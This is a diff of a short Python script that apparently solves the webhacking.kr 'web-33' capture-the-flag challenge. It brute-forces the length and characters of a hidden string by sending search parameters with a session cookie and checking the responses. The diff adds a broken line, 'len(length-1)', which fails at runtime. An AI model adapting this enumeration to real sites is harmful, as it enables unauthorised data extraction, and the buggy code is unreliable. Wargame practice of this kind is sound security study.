@@ -2,7 +2,7 @@ import requests
 import string
 
 url = "https://webhacking.kr/challenge/web-33/index.php"
-cookie = {'PHPSESSID': 'm583421oktu11value5t1h0crak3fe'}
+cookie = {'PHPSESSID': 'bo5kmggf060rsuok9ase3j1i4s'}
 
 str1=string.printable
 
@@ -10,12 +10,13 @@ def search_len(): # 44글자 (노가다로 구함)
     length = "_"
     for i in range(100):
         param = {"search":"{}".format(length)}
-        req = requests.post(url, params=param, cookies=cookie)
+        req = requests.post(url, data=param, cookies=cookie)
         print(param)
         if "readme" in req.text:
             length += "_"
         else:
             print("length:",length)
+            print("count:",len(length-1))
             break
 
 def search_str():
@@ -40,7 +41,9 @@ def search_str():
         print(string)
     print("String:", string)
 
-search_str()
+search_len()
+
+# search_str()
 
 # first export : "flag{himiko"
 
